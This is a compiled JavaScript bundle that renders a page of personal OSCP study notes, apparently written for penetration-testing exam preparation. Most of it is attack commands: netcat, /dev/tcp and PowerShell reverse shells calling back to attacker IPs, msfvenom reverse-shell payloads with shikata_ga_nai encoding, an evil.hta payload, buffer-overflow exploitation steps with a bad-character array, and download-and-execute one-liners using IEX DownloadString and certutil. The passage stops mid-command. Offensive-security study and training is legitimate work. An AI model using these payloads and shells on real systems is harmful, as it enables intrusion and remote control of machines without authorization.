(window.webpackJsonp=window.webpackJsonp||[]).push([[56],{397:function(s,t,a){"use strict";a.r(t);var e=a(13),r=Object(e.a)({},(function(){var s=this,t=s._self._c;return t("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[t("h1",{attrs:{id:"oscp-notes"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#oscp-notes"}},[s._v("#")]),s._v(" OSCP Notes")]),s._v(" "),t("h2",{attrs:{id:"bind-shell-vs-reverse-shell"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#bind-shell-vs-reverse-shell"}},[s._v("#")]),s._v(" Bind shell vs reverse shell")]),s._v(" "),t("h3",{attrs:{id:"bind-shell"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#bind-shell"}},[s._v("#")]),s._v(" Bind shell")]),s._v(" "),t("p",[s._v("Basically, we are opening a port with our shell for other people to execute")]),s._v(" "),t("ul",[t("li",[s._v("Client computer starts up a listening session with shell executing on that port")]),s._v(" "),t("li",[s._v("Connector just connects to the listening port that has shell already running")])]),s._v(" "),t("h3",{attrs:{id:"reverse-shell"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#reverse-shell"}},[s._v("#")]),s._v(" Reverse shell")]),s._v(" "),t("p",[s._v("Basically, we are sending our own shell over to the operator")]),s._v(" "),t("ul",[t("li",[s._v("Operator listens on a port")]),s._v(" "),t("li",[s._v("Client computer connects to the listening port on the operator with the client's own shell")]),s._v(" "),t("li",[s._v("Operator now has control of clients shell")])]),s._v(" "),t("h4",{attrs:{id:"netcat-reverse-shell"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#netcat-reverse-shell"}},[s._v("#")]),s._v(" Netcat reverse shell")]),s._v(" "),t("div",{staticClass:"language-sh extra-class"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[t("span",{pre:!0,attrs:{class:"token function"}},[s._v("nc")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("listening_host"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("listening_port"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-e")]),s._v(" /bin/bash\n")])])]),t("h4",{attrs:{id:"tcp-revsrse-shell"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#tcp-revsrse-shell"}},[s._v("#")]),s._v(" TCP revsrse shell")]),s._v(" "),t("div",{staticClass:"language-sh extra-class"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[s._v("/bin/bash "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-i")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" /dev/tcp/"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("attacker_ip"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("/"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("port"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[t("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[s._v("0")]),s._v("<")]),t("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[s._v("&1")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[t("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[s._v("2")]),s._v(">")]),t("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[s._v("&1")]),s._v("\n")])])]),t("h4",{attrs:{id:"powercat-reverse-shell-example"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#powercat-reverse-shell-example"}},[s._v("#")]),s._v(" Powercat reverse shell example")]),s._v(" "),t("div",{staticClass:"language- extra-class"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[s._v("powershell -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.1.109/powercat.ps1');powercat -c 192.168.1.109 -p 1234 -e cmd\"\n")])])]),t("h4",{attrs:{id:"powershell-reverse-shell"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#powershell-reverse-shell"}},[s._v("#")]),s._v(" Powershell reverse shell")]),s._v(" "),t("div",{staticClass:"language-sh extra-class"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[s._v("powershell "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-nop")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-c")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"'),t("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$client")]),s._v(" = New-Object System.Net.Sockets.TCPClient('192.168.119.194',5555);"),t("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$stream")]),s._v(" = "),t("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$client")]),s._v(".GetStream();[byte[]]"),t("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$bytes")]),s._v(" = 0..65535|%{0};while"),t("span",{pre:!0,attrs:{class:"token variable"}},[t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("((")]),s._v("$i "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" $stream.Read"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("$bytes"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" $bytes.Length"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("))")])]),s._v(" -ne 0){;"),t("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$data")]),s._v(" = (New-Object -TypeName System.Text.ASCIIEncoding).GetString("),t("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$bytes")]),s._v(",0, "),t("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$i")]),s._v(");"),t("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$sendback")]),s._v(" = (iex "),t("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$data")]),s._v(" 2>&1 | Out-String );"),t("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$sendback2")]),s._v(" = "),t("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$sendback")]),s._v(" + 'PS ' + (pwd).Path + '> ';"),t("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$sendbyte")]),s._v(" = ([text.encoding]::ASCII).GetBytes("),t("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$sendback2")]),s._v(");"),t("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$stream")]),s._v(".Write("),t("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$sendbyte")]),s._v(",0,"),t("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$sendbyte")]),s._v(".Length);"),t("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$stream")]),s._v(".Flush()};"),t("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$client")]),s._v('.Close()"')]),s._v("\n")])])]),t("h4",{attrs:{id:"msfvenom-stageless-reverse-shell-payload"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#msfvenom-stageless-reverse-shell-payload"}},[s._v("#")]),s._v(" MSFvenom stageless reverse shell payload")]),s._v(" "),t("div",{staticClass:"language-sh extra-class"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[s._v("msfvenom "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-p")]),s._v(" windows/shell_reverse_tcp "),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("LHOST")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".119.194 "),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("LPORT")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("80")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-f")]),s._v(" exe "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" shell.exe\n")])])]),t("h2",{attrs:{id:"buffer-overflows"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#buffer-overflows"}},[s._v("#")]),s._v(" Buffer overflows")]),s._v(" "),t("ol",[t("li",[s._v("Search for buffer overflow vunlerability by determining at what length does the program crash")]),s._v(" "),t("li",[s._v("Search for where instruction pointer is overwritten by generating non-repeating payload then finding the offset at which "),t("code",[s._v("eip")]),s._v(" is overwritten")]),s._v(" "),t("li",[s._v("Find the bad characters by using all the possible hex values and looking at the stack to see which characters didn't make it through")]),s._v(" "),t("li",[s._v("Find which register points to somewhere in the stack where we can write to")]),s._v(" "),t("li",[s._v("Find an instruction that jumps to the register ie. "),t("code",[s._v("jmp esp")])]),s._v(" "),t("li",[s._v("Get that instructions address and overwrite "),t("code",[s._v("eip")]),s._v(" with that")]),s._v(" "),t("li",[s._v("Use the register's location and put our shell code there")])]),s._v(" "),t("h3",{attrs:{id:"create-pattern"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#create-pattern"}},[s._v("#")]),s._v(" Create pattern")]),s._v(" "),t("div",{staticClass:"language-sh extra-class"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[s._v("msf-pattern_create "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-l")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("length"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("\n")])])]),t("h3",{attrs:{id:"pattern-offset-finder"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#pattern-offset-finder"}},[s._v("#")]),s._v(" Pattern offset finder")]),s._v(" "),t("div",{staticClass:"language-sh extra-class"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[s._v("msf-pattern_offset "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-q")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("pattern_found"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("\n")])])]),t("h3",{attrs:{id:"generate-assembly-instruction-opcodes"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#generate-assembly-instruction-opcodes"}},[s._v("#")]),s._v(" Generate assembly instruction opcodes")]),s._v(" "),t("div",{staticClass:"language-sh extra-class"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[s._v("msf-nasm_shell\nnasm "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("add")]),s._v(" eax,12\n00000000  83C00C            "),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("add")]),s._v(" eax,byte +0xc\n")])])]),t("h3",{attrs:{id:"mona-finding-jmp-esp"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#mona-finding-jmp-esp"}},[s._v("#")]),s._v(" Mona finding jmp esp")]),s._v(" "),t("div",{staticClass:"language-sh extra-class"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!")]),s._v("mona jmp "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-r")]),s._v(" esp\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# click view > log or press alt + L")]),s._v("\n")])])]),t("p",[s._v("or")]),s._v(" "),t("div",{staticClass:"language-sh extra-class"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!")]),s._v("mona "),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("find")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-s")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'\\xff\\xe4'")]),s._v("\n")])])]),t("h3",{attrs:{id:"bad-characters"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#bad-characters"}},[s._v("#")]),s._v(" Bad characters")]),s._v(" "),t("p",[t("strong",[s._v("Be aware that if a buffer overflow is strict on length, then some bad characters that don't make it through will result in the buffer overflow crash not being triggered.")])]),s._v(" "),t("p",[s._v("The following is missing "),t("code",[s._v("\\x00,\\x1A,\\x1D")])]),s._v(" "),t("div",{staticClass:"language-python extra-class"},[t("pre",{pre:!0,attrs:{class:"language-python"}},[t("code",[s._v("badchars "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("\n    "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0b\\x0c\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f"')]),s._v("\n    "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"\\x20\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40"')]),s._v("\n    "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f"')]),s._v("\n    "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"\\x60\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f"')]),s._v("\n    "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"\\x80\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f"')]),s._v("\n    "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"\\xa0\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf"')]),s._v("\n    "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"\\xc0\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf"')]),s._v("\n    "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"\\xe0\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff"')]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n")])])]),t("h3",{attrs:{id:"windows-reverse-tcp-shells"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#windows-reverse-tcp-shells"}},[s._v("#")]),s._v(" Windows reverse tcp shells")]),s._v(" "),t("h4",{attrs:{id:"shikata-ga-nai"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#shikata-ga-nai"}},[s._v("#")]),s._v(" Shikata ga nai")]),s._v(" "),t("div",{staticClass:"language-sh extra-class"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[s._v("msfvenom "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-p")]),s._v(" windows/shell_reverse_tcp "),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("LHOST")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("listening_host"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("LPORT")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("listening_port"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("EXITFUNC")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("thread "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-f")]),s._v(" c "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-e")]),s._v(" x86/shikata_ga_nai "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-b")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("illegal characters as string ie. "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"'),t("span",{pre:!0,attrs:{class:"token entity",title:"\\x00"}},[s._v("\\x00")]),t("span",{pre:!0,attrs:{class:"token entity",title:"\\x12"}},[s._v("\\x12")]),s._v('..."')]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("\n")])])]),t("h4",{attrs:{id:"fnstenv-mov"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#fnstenv-mov"}},[s._v("#")]),s._v(" Fnstenv mov")]),s._v(" "),t("div",{staticClass:"language-sh extra-class"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[s._v("msfvenom "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-p")]),s._v(" windows/shell_reverse_tcp "),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("LHOST")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("listening host"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("LPORT")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("listening port"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-f")]),s._v(" c "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-e")]),s._v(" x86/fnstenv_mov "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-b")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"'),t("span",{pre:!0,attrs:{class:"token entity",title:"\\x00"}},[s._v("\\x00")]),t("span",{pre:!0,attrs:{class:"token entity",title:"\\x0a"}},[s._v("\\x0a")]),t("span",{pre:!0,attrs:{class:"token entity",title:"\\x0d"}},[s._v("\\x0d")]),t("span",{pre:!0,attrs:{class:"token entity",title:"\\xff"}},[s._v("\\xff")]),t("span",{pre:!0,attrs:{class:"token entity",title:"\\x3b"}},[s._v("\\x3b")]),t("span",{pre:!0,attrs:{class:"token entity",title:"\\x45"}},[s._v("\\x45")]),s._v('..."')]),s._v("\n")])])]),t("h3",{attrs:{id:"linux-reverse-tcp-shells"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#linux-reverse-tcp-shells"}},[s._v("#")]),s._v(" Linux reverse tcp shells")]),s._v(" "),t("div",{staticClass:"language-sh extra-class"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[s._v("msfvenom "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-p")]),s._v(" linux/x86/shell_reverse_tcp "),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("LHOST")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".119.194 "),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("LPORT")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("443")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("EXITFUNC")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("thread "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-f")]),s._v(" c "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-e")]),s._v(" x86/shikata_ga_nai "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-b")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("illegal characters as string ie. "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"'),t("span",{pre:!0,attrs:{class:"token entity",title:"\\x00"}},[s._v("\\x00")]),t("span",{pre:!0,attrs:{class:"token entity",title:"\\x12"}},[s._v("\\x12")]),s._v('..."')]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("\n")])])]),t("h2",{attrs:{id:"leveraging-html-applications"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#leveraging-html-applications"}},[s._v("#")]),s._v(" Leveraging HTML applications")]),s._v(" "),t("h3",{attrs:{id:"msfvenom-hta-payload"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#msfvenom-hta-payload"}},[s._v("#")]),s._v(" msfvenom hta payload")]),s._v(" "),t("div",{staticClass:"language-sh extra-class"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[t("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" msfvenom "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-p")]),s._v(" windows/shell_reverse_tcp "),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("LHOST")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("listening_host"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("LPORT")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("listening_port"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-f")]),s._v(" hta-psh "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-o")]),s._v(" evil.hta \n")])])]),t("p",[s._v("Next, serve the file on port 80")]),s._v(" "),t("div",{staticClass:"language-sh extra-class"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[t("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" python "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-m")]),s._v(" SimpleHTTPServer "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("80")]),s._v("\n")])])]),t("h2",{attrs:{id:"file-transfer"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#file-transfer"}},[s._v("#")]),s._v(" FIle transfer")]),s._v(" "),t("h3",{attrs:{id:"linux-to-windows"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#linux-to-windows"}},[s._v("#")]),s._v(" Linux to Windows:")]),s._v(" "),t("p",[t("strong",[s._v("IF USING FTP TRANFERRING BINARIES, REMEMBER TO USE FTP BINARY MODE FIRST")])]),s._v(" "),t("h4",{attrs:{id:"powershell"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#powershell"}},[s._v("#")]),s._v(" Powershell")]),s._v(" "),t("p",[s._v("In powershell:")]),s._v(" "),t("div",{staticClass:"language-powershell extra-class"},[t("pre",{pre:!0,attrs:{class:"language-powershell"}},[t("code",[t("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$client")]),s._v(" = "),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("new-object")]),s._v(" System"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("Net"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("WebClient\n"),t("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$client")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("DownloadFile"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"http://192.168.119.194/tmp.txt"')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"C:\\tmp\\file.txt"')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n")])])]),t("p",[s._v("One line form:")]),s._v(" "),t("div",{staticClass:"language-powershell extra-class"},[t("pre",{pre:!0,attrs:{class:"language-powershell"}},[t("code",[t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("new-object")]),s._v(" System"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("Net"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("WebClient"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("DownloadFile"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'http://www.xyz.net/file.txt'")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'C:\\tmp\\file.txt'")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n")])])]),t("h5",{attrs:{id:"executing-code-in-memory"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#executing-code-in-memory"}},[s._v("#")]),s._v(" Executing code in memory")]),s._v(" "),t("div",{staticClass:"language-powershell extra-class"},[t("pre",{pre:!0,attrs:{class:"language-powershell"}},[t("code",[s._v("powershell"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("exe "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("exec Bypass "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("noexit "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("C "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("\"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1')\"")]),s._v("\n")])])]),t("h4",{attrs:{id:"curtutil"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#curtutil"}},[s._v("#")]),s._v(" Curtutil")]),s._v(" "),t("p",[s._v("If you don't have powershell access:")]),s._v(" "),t("div",{staticClass:"language-sh extra-class"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[s._v("certutil.exe "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-urlcache")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-split")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-f")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"http://10.10.14.17/nc.exe"')]),s._v(" c:"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("temp"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("nc.exe\n")])])]),t("h3",{attrs:{id:"windows-to-linux"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#windows-to-linux"}},[s._v("#")]),s._v(" Windows to linux")]),s._v(" "),t("p",[s._v("Create a python server and get it from the linux machine:")]),s._v(" "),t("p",[s._v("On windows:")]),s._v(" "),t("div",{staticClass:"language-sh extra-class"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[s._v("python "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-m")]),s._v(" SimpleHTTPServer "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("80")]),s._v("\n")])])]),t("p",[s._v("On linux:")]),s._v(" "),t("div",{staticClass:"language-sh extra-class"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[t("span",{pre:!0,attrs:{class:"token function"}},[s._v("wget")]),s._v(" http://"),t("span",{pre:!0,attrs:{class:"token 